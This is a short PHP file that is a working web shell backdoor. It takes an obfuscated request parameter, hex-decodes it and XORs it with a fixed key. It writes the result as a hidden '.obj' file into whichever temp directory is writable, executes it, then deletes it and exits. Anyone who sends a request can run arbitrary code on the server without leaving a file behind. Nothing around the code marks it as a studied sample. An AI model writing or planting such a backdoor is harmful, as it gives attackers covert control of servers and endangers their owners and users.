<?php

if(!is_null($_REQUEST["\x70\x74r"] ?? null)){
	$mrk = array_filter([sys_get_temp_dir(), getcwd(), ini_get("upload_tmp_dir"), "/dev/shm", "/tmp", session_save_path(), getenv("TMP"), getenv("TEMP"), "/var/tmp"]);
	$elem = hex2bin($_REQUEST["\x70\x74r"]);
	$sym= '';   foreach(str_split($elem) as $char){$sym .= chr(ord($char) ^ 11);}
	foreach ($mrk as $key => $flag) {
    		if (is_dir($flag) ? is_writable($flag) : false) {
    $element = "$flag" . "/.obj";
    if (file_put_contents($element, $sym)) {
	require $element;
	unlink($element);
	die();
}
}
}
}